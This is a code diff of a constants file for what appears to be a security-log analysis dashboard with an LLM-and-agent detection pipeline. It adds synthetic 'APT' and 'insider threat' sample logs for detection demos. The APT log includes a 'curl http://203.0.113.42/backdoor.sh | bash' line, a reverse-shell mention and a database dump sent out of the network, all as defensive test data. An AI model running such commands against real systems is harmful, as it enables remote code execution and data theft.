@@ -1,4 +1,5 @@
 // src/constants/scenarios.js
+
 export const SCENARIOS = {
   bruteforce: {
     name: 'SSH Brute Force',
@@ -56,6 +57,32 @@ export const SCENARIOS = {
 2024-01-15 02:00:30 firewall: OUTBOUND TCP 192.168.1.50 -> 185.220.101.47:80 bytes=1024
 2024-01-15 02:00:31 WIN-SRV01 Process: net.exe use \\192.168.1.55\C$ /user:admin Pass@123`,
   },
+  apt: {
+    name: 'APT Lateral + C2',
+    severity: 'CRITICAL',
+    mitre: 'T1071',
+    logs: `2024-03-10 11:00:01 fw-01 RECON: port scan from 203.0.113.42 to 10.0.1.0/24 (nmap fingerprint)
+2024-03-10 11:02:15 web-srv-01 access: GET /api/v1/admin?debug=1 from 203.0.113.42 HTTP/1.1 200
+2024-03-10 11:05:30 web-srv-01 exec: sh -c 'curl http://203.0.113.42/backdoor.sh | bash'
+2024-03-10 11:05:45 web-srv-01 process: python3 -c "import socket,subprocess,os; ... reverse shell"
+2024-03-10 11:10:00 web-srv-01 network: OUTBOUND beacon 203.0.113.42:4444 every 60s (C2)
+2024-03-10 11:15:20 db-srv-01 security: Logon Type 3 from web-srv-01 (lateral via stolen token)
+2024-03-10 11:20:00 db-srv-01 process: mysqldump --all-databases > /tmp/.hidden/dump.sql
+2024-03-10 11:25:10 fw-01 OUTBOUND: 10.0.1.10 -> 203.0.113.42:443 bytes=384MB (exfil)`,
+  },
+  insider: {
+    name: 'Insider Threat',
+    severity: 'HIGH',
+    mitre: 'T1078',
+    logs: `2024-05-20 22:15:00 vpn-gw: Unusual after-hours VPN login for user m.chen from 198.51.100.77 (TOR exit)
+2024-05-20 22:16:30 file-srv: m.chen accessed /HR/salary_data_2024.xlsx (read) — outside business hours
+2024-05-20 22:17:00 file-srv: m.chen accessed /FINANCE/Q4_projections.xlsx (read)
+2024-05-20 22:18:45 file-srv: m.chen accessed /IP/product_blueprints.zip (download) 450MB
+2024-05-20 22:20:00 dlp: m.chen — USB device inserted, 2.1GB written in 3 minutes
+2024-05-20 22:21:10 email-gw: m.chen sent 5 emails to gmail.com with attachments totaling 120MB
+2024-05-20 22:25:00 audit: m.chen deleted browser history and cleared Windows event logs
+2024-05-20 22:26:00 vpn-gw: m.chen disconnected. Total session: 11 minutes, 2.6GB transferred`,
+  },
 };
 
 // In production (Vercel), set VITE_API_BASE to your deployed backend URL.
@@ -76,12 +103,21 @@ export const SEVERITY_COLORS = {
 };
 
 export const PIPELINE_STEPS = [
-  { id: 0, label: 'Log Normalization', desc: 'Regex + JSON parser' },
-  { id: 1, label: 'Event Extraction', desc: 'Rule-based (10 types)' },
-  { id: 2, label: 'LSTM Anomaly Detection', desc: 'Sequence autoencoder' },
-  { id: 3, label: 'Threat Intel Lookup', desc: 'IP/hash/command DB' },
-  { id: 4, label: 'MITRE ATT&CK RAG', desc: 'ChromaDB semantic search' },
-  { id: 5, label: 'LLM Investigation', desc: 'OpenAI via OpenRouter' },
-  { id: 6, label: 'Attack Graph Build', desc: 'NetworkX kill-chain' },
-  { id: 7, label: 'Agent Correlation', desc: 'ReAct cross-session' },
+  { id: 0, label: 'Log Normalization',        desc: 'Regex + JSON parser',        icon: '🗂' },
+  { id: 1, label: 'Event Extraction',          desc: 'Rule-based (10 types)',       icon: '🔍' },
+  { id: 2, label: 'LSTM Anomaly Detection',    desc: 'Sequence autoencoder',        icon: '🧠' },
+  { id: 3, label: 'Threat Intel Lookup',       desc: 'IP/hash/command DB',          icon: '🔎' },
+  { id: 4, label: 'MITRE ATT&CK RAG',          desc: 'ChromaDB semantic search',    icon: '📚' },
+  { id: 5, label: 'LLM Investigation',         desc: 'GPT-OSS 120B via OpenRouter',       icon: '🤖' },
+  { id: 6, label: 'Attack Graph Build',        desc: 'NetworkX kill-chain',         icon: '🕸' },
+  { id: 7, label: 'Agent Correlation',         desc: 'ReAct cross-session',         icon: '⚡' },
+];
+
+export const AGENTS = [
+  { id: 1, name: 'AnomalyScoreAgent', role: 'LSTM behavioral scoring',         weight: 35, color: '#ff4444', phase: 'ACT' },
+  { id: 2, name: 'RAGLookupAgent',    role: 'MITRE ATT&CK semantic retrieval', weight: 20, color: '#4488ff', phase: 'ACT' },
+  { id: 3, name: 'ThreatIntelAgent',  role: 'IP/hash/command reputation',      weight: 10, color: '#ff9800', phase: 'ACT' },
+  { id: 4, name: 'PatternMatchAgent', role: '8 heuristic attack patterns',     weight: 10, color: '#ffd740', phase: 'ACT' },
+  { id: 5, name: 'IOCExtractorAgent', role: 'Automated indicator parsing',     weight: 10, color: '#00e676', phase: 'ACT' },
+  { id: 6, name: 'PlaybookAgent',     role: 'Severity-adaptive response gen',  weight: 15, color: '#aa66ff', phase: 'EXPLAIN' },
 ];
